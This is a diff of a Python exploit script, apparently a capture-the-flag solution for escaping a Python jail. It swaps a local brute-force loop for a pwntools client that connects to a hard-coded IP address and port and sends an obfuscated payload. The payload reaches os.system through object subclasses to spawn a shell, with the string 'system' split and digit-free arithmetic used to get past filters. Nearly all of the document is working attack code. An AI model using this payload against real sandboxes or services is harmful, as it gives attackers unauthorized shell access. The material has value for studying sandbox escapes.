@@ -1,15 +1,18 @@
-fori,eleminenumerate(().__class__.__base__.__subclasses__()):
-try:
-print(i)
-exec(().__class__.__base__.__subclasses__()[i].__init__.__globals__["sy""stem"]("s""h"))
-except:
-continue
+from pwn import remote
 
+host = '192.214.171.83'
+port = 3001
 
-#().__class__.__base__.__subclasses__()[-(((0**0<<0**0)**(0**0<<0**0)**(0**0<<0**0)<<(0**0<<0**0))*(0**0<<0**0)-(0**0<<0**0)-(0**0))].__init__.__globals__["sy""stem"]("s""h")
-#().__class__.__base__.__subclasses__()[157].__init__.__globals__["sy""stem"]("s""h")
+conn = remote(host, port)
 
-().__class__.__base__.__subclasses__()[(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<((0**0<<0**0)<<0**0)))-(-(0**0<<(((0**0<<0**0)<<0**0)-0**0)))-(-(0**0<<(0**0<<0**0)))-(-(0**0<<(0**0-0**0)))].__init__.__globals__["sy""stem"]("s""h")
+text = conn.recvuntil(b'> ').decode().strip()
+print(text)
 
+payload = '().__class__.__base__.__subclasses__()[(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<((0**0<<0**0)<<0**0)))-(-(0**0<<(((0**0<<0**0)<<0**0)-0**0)))-(-(0**0<<(0**0<<0**0)))-(-(0**0<<(0**0-0**0)))].__init__.__globals__["sy""stem"]("s""h")'
+conn.writeline(payload)
 
+text = conn.recvuntil(b'> ').decode().strip()
+print(text)
 
+conn.writeline(b'q')
+conn.close()
